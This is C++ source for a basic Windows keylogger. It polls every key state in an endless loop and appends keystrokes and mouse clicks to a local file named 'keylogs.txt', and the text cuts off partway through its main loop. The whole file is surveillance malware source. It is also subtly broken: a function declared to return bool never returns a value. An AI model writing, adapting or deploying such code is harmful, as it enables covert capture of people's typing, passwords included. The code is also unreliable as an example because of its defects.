#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;

void Writelog(LPCSTR text){
    ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text;
    logfile.close();
}

bool Keylist(int iKey){
    switch(iKey){
        case VK_RBUTTON:
            cout << "rclick";
            Writelog(" rclick ");
			 break;
        case VK_LBUTTON:
            cout << "lclick";
            Writelog(" lclick ");
            break;
		case VK_SPACE:
            cout << " ";
            Writelog(" ");
            break;
		case VK_RETURN:
            cout << "\n";
            Writelog("\n");
            break;
		case VK_SHIFT:
            cout << " shift ";
            Writelog(" Shift ");
            break;
		case VK_BACK:
            cout << "\b";
            Writelog("\b");
            break;
		default:
            false;
    }
}

int main(){
    char key;
	while(TRUE){
        Sleep(10);
		for (key=8; key<=190; key++){
            if (GetAsyncKeyState(key) == -32767){
			if(Keylist(key) == FALSE){
                    cout << key;
					ofstream logfile;
                    logfile.open("keylogs.txt", fstream::app);